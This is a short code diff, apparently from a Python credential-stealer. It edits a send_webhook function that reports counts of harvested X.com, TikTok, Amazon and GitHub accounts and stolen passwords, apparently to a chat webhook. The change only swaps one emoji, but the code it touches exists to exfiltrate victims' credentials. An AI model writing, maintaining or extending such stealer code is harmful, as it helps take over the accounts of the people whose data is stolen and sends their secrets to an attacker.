@@ -1321,7 +1321,7 @@ def send_webhook():
                           f":black_circle:`X.com:` **{len(main_info[7])}**\n"
                           f":white_circle:`TikTok:` **{len(main_info[8])}**\n"
                           f":yellow_circle:`Amazon:` **{len(main_info[9])}**\n"
-                          f":grey_circle:`GitHub:` **{len(main_info[10])}**\n"
+                          f":black_circle:`GitHub:` **{len(main_info[10])}**\n"
                           f":brown_circle:`Passwords:` **{len(main_info[4])}**\n",
                     inline=False,
                 )
